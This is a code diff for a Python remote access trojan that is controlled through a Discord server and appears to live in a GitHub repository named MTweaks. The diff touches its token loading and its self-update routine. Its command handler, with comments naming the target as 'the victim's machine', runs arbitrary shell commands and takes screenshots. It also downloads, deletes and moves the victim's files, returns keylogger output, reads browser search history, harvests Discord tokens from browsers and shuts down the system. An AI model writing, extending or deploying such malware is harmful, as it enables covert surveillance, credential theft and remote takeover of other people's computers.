@@ -11,17 +11,16 @@ from discord import File, Embed
 from pynput import keyboard
 import sqlite3
 import shutil
-from cryptography.fernet import Fernet
+from dotenv import load_dotenv  # Ensure python-dotenv is installed
+
+# Load environment variables from .env file
+load_dotenv()
 
 # Constants
-ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")
 ENCRYPTED_DISCORD_TOKEN = os.getenv("ENCRYPTED_DISCORD_TOKEN")
-
-if not ENCRYPTION_KEY or not ENCRYPTED_DISCORD_TOKEN:
-    raise ValueError("Encryption key or encrypted token is missing.")
-
-cipher_suite = Fernet(ENCRYPTION_KEY.encode())
-DISCORD_TOKEN = cipher_suite.decrypt(ENCRYPTED_DISCORD_TOKEN.encode()).decode()
+if not ENCRYPTED_DISCORD_TOKEN:
+    raise ValueError("Discord token is missing.")
+DISCORD_TOKEN = ENCRYPTED_DISCORD_TOKEN  # Directly assign the token
 SERVER_ID = 1350570142681141381
 CHANNELS = ["commands", "recordings", "mic-listening", "logs", "files", "keylogger"]
 COMMAND_PREFIX = ","
@@ -197,38 +196,42 @@ def start_keylogging():
 def update_script():
     try:
         repo_url = "https://github.com/tfssolacedev/MTweaks.git"
-        raw_file_url = "https://raw.githubusercontent.com/tfssolacedev/MTweaks/main/m.py"
         temp_dir = "temp_update"
         local_script_path = os.path.abspath(__file__)
-        # Step 1: Clone the repository (if not already cloned)
+
+        # Step 1: Clone the repository if not already cloned
         if not os.path.exists(temp_dir):
             print("Cloning repository...")
             subprocess.run(["git", "clone", repo_url, temp_dir], check=True)
-        # Step 2: Check if m.py exists in the cloned repository
-        repo_script_path = os.path.join(temp_dir, "m.py")
-        if not os.path.exists(repo_script_path):
-            print("Downloading m.py directly from raw URL...")
-            response = requests.get(raw_file_url)
-            if response.status_code == 200:
-                with open(repo_script_path, "wb") as f:
-                    f.write(response.content)
-            else:
-                raise Exception(f"Failed to download m.py. HTTP Status Code: {response.status_code}")
+
+        # Step 2: Pull the latest changes from the repository
+        print("Pulling latest changes...")
+        subprocess.run(["git", "-C", temp_dir, "pull"], check=True)
+
         # Step 3: Compare the local script with the repository version
+        repo_script_path = os.path.join(temp_dir, "m.py")
+        
+        if not os.path.exists(repo_script_path):
+            raise Exception(f"Could not find m.py in the repository at {repo_script_path}")
+
         with open(local_script_path, "r", encoding="utf-8") as local_file:
             local_content = local_file.read()
+
         with open(repo_script_path, "r", encoding="utf-8") as repo_file:
             repo_content = repo_file.read()
+
         if local_content != repo_content:
             print("Update found! Updating the script...")
             shutil.copy(repo_script_path, local_script_path)
             print("Script updated successfully. Restarting...")
-            os.execv(sys.executable, [sys.executable] + sys.argv)
+            os.execv(sys.executable, [sys.executable] + sys.argv)  # Restart the script with the updated version
         else:
             print("No updates available.")
+
         # Clean up temporary files
         if os.path.exists(temp_dir):
             shutil.rmtree(temp_dir)
+
     except Exception as e:
         print(f"Error updating script: {e}")
 
@@ -277,7 +280,7 @@ async def on_message(message):
     if not content.startswith(COMMAND_PREFIX):
         return
     command = content[len(COMMAND_PREFIX):].strip().lower()
-
+    
     if command == "help":
         embed = Embed(title="Help Menu", description="Available Commands:", color=discord.Color.green())
         embed.add_field(name=",exec <command>", value="Execute a shell command.", inline=False)
@@ -299,12 +302,14 @@ async def on_message(message):
         embed.add_field(name=",get-discord-tokens", value="Retrieve Discord tokens from common browsers (Windows only).", inline=False)
         embed.add_field(name=",help", value="Display this help message.", inline=False)
         await message.channel.send(embed=embed)
+
     elif command.startswith("exec "):
         # Execute shell command
         cmd = command[5:]
         output = await execute_shell_command(cmd)
         embed = Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.blue())
         await message.channel.send(embed=embed)
+
     elif command == "info":
         # Send system info
         info = get_system_info()
@@ -312,6 +317,7 @@ async def on_message(message):
         for key, value in info.items():
             embed.add_field(name=key.capitalize(), value=value, inline=False)
         await message.channel.send(embed=embed)
+
     elif command.startswith("upload-url "):
         # Upload a file from a URL
         try:
@@ -326,6 +332,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error processing upload-url: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("upload-file"):
         # Upload a file attached to the message
         if len(message.attachments) == 0:
@@ -343,6 +350,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error processing upload-file: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "screenshot":
         # Take a screenshot
         screenshot_path = take_screenshot()
@@ -352,6 +360,7 @@ async def on_message(message):
         else:
             embed = Embed(title="Error", description="Failed to take screenshot.", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("set-volume "):
         # Set system volume (Windows only)
         try:
@@ -362,11 +371,13 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Invalid volume level: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "list-files":
         # List files in the current directory
         output = list_files()
         embed = Embed(title="Files in Directory", description=f"```\n{output}\n```", color=discord.Color.blue())
         await message.channel.send(embed=embed)
+
     elif command == "search-history":
         # Get search history (Windows only)
         if platform.system() == "Windows":
@@ -381,6 +392,7 @@ async def on_message(message):
         else:
             embed = Embed(title="Error", description="Search history is only supported on Windows.", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("download "):
         # Download a file from the victim's machine
         try:
@@ -393,6 +405,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error downloading file: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("delete "):
         # Delete a file on the victim's machine
         try:
@@ -407,6 +420,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error deleting file: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("move "):
         # Move a file on the victim's machine
         try:
@@ -423,6 +437,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error moving file: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command.startswith("copy "):
         # Copy a file on the victim's machine
         try:
@@ -439,6 +454,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error copying file: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "shutdown":
         # Shutdown the system
         try:
@@ -451,6 +467,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error shutting down: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "restart":
         # Restart the system
         try:
@@ -463,6 +480,7 @@ async def on_message(message):
         except Exception as e:
             embed = Embed(title="Error", description=f"Error restarting: {e}", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "keylog":
         # Retrieve the keylog file
         if os.path.exists(KEYLOG_FILE):
@@ -470,11 +488,13 @@ async def on_message(message):
         else:
             embed = Embed(title="Error", description="Keylog file not found.", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     elif command == "ping":
         # Check the bot's latency
         latency = round(client.latency * 1000)  # Convert to milliseconds
         embed = Embed(title="Ping", description=f"Pong! Latency: {latency}ms", color=discord.Color.green())
         await message.channel.send(embed=embed)
+
     elif command == "get-discord-tokens":
         # Retrieve Discord tokens from common browsers (Windows only)
         if platform.system() != "Windows":
@@ -490,6 +510,7 @@ async def on_message(message):
         else:
             embed = Embed(title="Discord Tokens", description="No Discord tokens found.", color=discord.Color.red())
             await message.channel.send(embed=embed)
+
     else:
         embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
         await message.channel.send(embed=embed)
